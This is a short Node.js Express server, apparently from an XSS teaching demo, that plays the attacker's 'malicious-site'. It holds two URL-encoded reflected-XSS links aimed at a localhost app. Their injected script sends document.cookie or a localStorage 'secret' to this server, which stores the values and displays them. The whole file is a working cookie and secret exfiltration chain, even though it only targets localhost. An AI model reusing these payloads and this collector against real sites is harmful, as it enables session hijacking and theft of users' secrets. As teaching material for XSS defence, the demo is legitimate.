const express = require('express')
const cors = require('cors')
const app = express()
app.use(cors())

const port = 3001
const data = []
const cookie_link = 'http://localhost:3000/?comment=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A3001%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E'
const storage_link = 'http://localhost:3000/?comment=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A3001%2F%3Fdata%3D%24%7BlocalStorage.getItem%28%22secret%22%29%7D%60%29%3C%2Fscript%3E%0D%0A'

app.set('views', './malicious-site')
app.set('view engine', 'ejs')

app.get('/', (req, res) => {
    if (req.query.data)
        data.push(req.query.data)
    res.render('index', {
        data,
        cookie_link,
        storage_link
    })
})

app.listen(port, () => console.log(`The malicious-site server is listening at http://localhost:${port}`))